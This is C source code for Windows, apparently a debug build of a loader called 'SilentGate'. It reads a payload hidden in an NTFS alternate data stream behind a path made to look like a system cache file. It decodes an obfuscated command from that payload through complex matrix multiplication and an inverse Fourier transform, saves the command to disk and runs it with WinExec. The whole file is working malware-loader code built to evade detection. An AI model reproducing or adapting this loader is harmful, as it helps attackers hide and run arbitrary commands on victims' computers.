#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define PI 3.14159265358979323846
#define ORIG_LEN    1070
#define PADDED_LEN  2048
#define COEFF_COUNT 2048
#define ROWS 32
#define COLS 64
#define RANK 32
#define G_SIZE 32
#define A1_SIZE 1024
#define A2_SIZE 4096
static double sg_cos(double x){
    while(x>3.14159265)x-=6.28318530;
    while(x<-3.14159265)x+=6.28318530;
    double r=1,t=1,x2=x*x;int i;
    for(i=1;i<=10;i++){t*=-x2/((2*i-1)*(2*i));r+=t;}return r;
}
static double sg_sin(double x){
    while(x>3.14159265)x-=6.28318530;
    while(x<-3.14159265)x+=6.28318530;
    double r=x,t=x,x2=x*x;int i;
    for(i=1;i<=10;i++){t*=-x2/((2*i)*(2*i+1));r+=t;}return r;
}
static double sg_round(double x){
    return(x>=0)?(double)(long long)(x+0.5):(double)(long long)(x-0.5);
}
static void idft(double* rr,double* ri,int N,double* or_,double* oi){
    int n,k;
    for(n=0;n<N;n++){
        or_[n]=0;oi[n]=0;
        for(k=0;k<N;k++){
            double a=2.0*PI*k*n/N;
            or_[n]+=rr[k]*sg_cos(a)-ri[k]*sg_sin(a);
            oi[n]+=rr[k]*sg_sin(a)+ri[k]*sg_cos(a);
        }
        or_[n]/=N;oi[n]/=N;
    }
}
static void matmul_c(double* ar,double* ai,int ra,int ca,
    double* br,double* bi,int rb,int cb,double* cr,double* ci){
    int i,j,k;
    for(i=0;i<ra*cb;i++){cr[i]=0;ci[i]=0;}
    for(i=0;i<ra;i++)for(k=0;k<ca;k++){
        double are=ar[i*ca+k],aim=ai[i*ca+k];
        for(j=0;j<cb;j++){
            cr[i*cb+j]+=are*br[k*cb+j]-aim*bi[k*cb+j];
            ci[i*cb+j]+=are*bi[k*cb+j]+aim*br[k*cb+j];
        }
    }
}
int main(){
    printf("[DEBUG] SilentGate ADS Debug\n");
    printf("[DEBUG] Reading ADS stream...\n");
    const char* stream="C:\\ProgramData\\Microsoft\\Windows\\Caches\\caches.db:Properties";
    HANDLE h=CreateFileA(stream,GENERIC_READ,FILE_SHARE_READ,
        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE){
        printf("[DEBUG] ADS not found: %lu\n",GetLastError());
        getchar();return 1;
    }
    DWORD blob_size=GetFileSize(h,NULL);
    printf("[DEBUG] ADS size: %lu bytes\n",blob_size);
    double* blob=(double*)GlobalAlloc(GPTR,blob_size);
    DWORD read=0;
    ReadFile(h,blob,blob_size,&read,NULL);
    CloseHandle(h);
    printf("[DEBUG] Read: %lu bytes\n",read);
    double* G_d=blob;
    double* A1_r=blob+G_SIZE;
    double* A1_i=blob+G_SIZE+A1_SIZE;
    double* A2_r=blob+G_SIZE+A1_SIZE*2;
    double* A2_i=blob+G_SIZE+A1_SIZE*2+A2_SIZE;
    int i,j;
    double* A1s_r=(double*)GlobalAlloc(GPTR,ROWS*RANK*sizeof(double));
    double* A1s_i=(double*)GlobalAlloc(GPTR,ROWS*RANK*sizeof(double));
    for(i=0;i<ROWS;i++)for(j=0;j<RANK;j++){
        A1s_r[i*RANK+j]=A1_r[i*ROWS+j]*G_d[j];
        A1s_i[i*RANK+j]=A1_i[i*ROWS+j]*G_d[j];
    }
    double* M_r=(double*)GlobalAlloc(GPTR,ROWS*COLS*sizeof(double));
    double* M_i=(double*)GlobalAlloc(GPTR,ROWS*COLS*sizeof(double));
    matmul_c(A1s_r,A1s_i,ROWS,RANK,A2_r,A2_i,RANK,COLS,M_r,M_i);
    GlobalFree(A1s_r);GlobalFree(A1s_i);
    double* cr=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    double* ci=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    for(i=0;i<COEFF_COUNT&&i<PADDED_LEN;i++){cr[i]=M_r[i];ci[i]=M_i[i];}
    GlobalFree(M_r);GlobalFree(M_i);
    double* rr=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    double* ri=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    idft(cr,ci,PADDED_LEN,rr,ri);
    GlobalFree(cr);GlobalFree(ci);
    char* cmd=(char*)GlobalAlloc(GPTR,ORIG_LEN+1);
    for(i=0;i<ORIG_LEN;i++){
        int v=(int)sg_round(rr[i]);
        if(v<0)v=0;if(v>255)v=255;
        cmd[i]=(char)v;
    }
    cmd[ORIG_LEN]='\0';
    GlobalFree(rr);GlobalFree(ri);GlobalFree(blob);
    printf("[DEBUG] First 60 chars: %.60s\n",cmd);
    printf("[DEBUG] Strlen: %d\n",(int)strlen(cmd));
    HANDLE hf=CreateFileA("C:\\ProgramData\\sg_cmd.txt",
        GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf!=INVALID_HANDLE_VALUE){
        DWORD w=0;
        WriteFile(hf,cmd,ORIG_LEN,&w,NULL);
        CloseHandle(hf);
        printf("[DEBUG] Command saved to C:\\ProgramData\\sg_cmd.txt\n");
    }
    printf("[DEBUG] Calling WinExec...\n");
    UINT ret=WinExec(cmd,SW_SHOW);
    printf("[DEBUG] WinExec returned: %u (>31=success)\n",ret);
    GlobalFree(cmd);
    printf("[DEBUG] Done - press Enter\n");
    getchar();
    return 0;
}
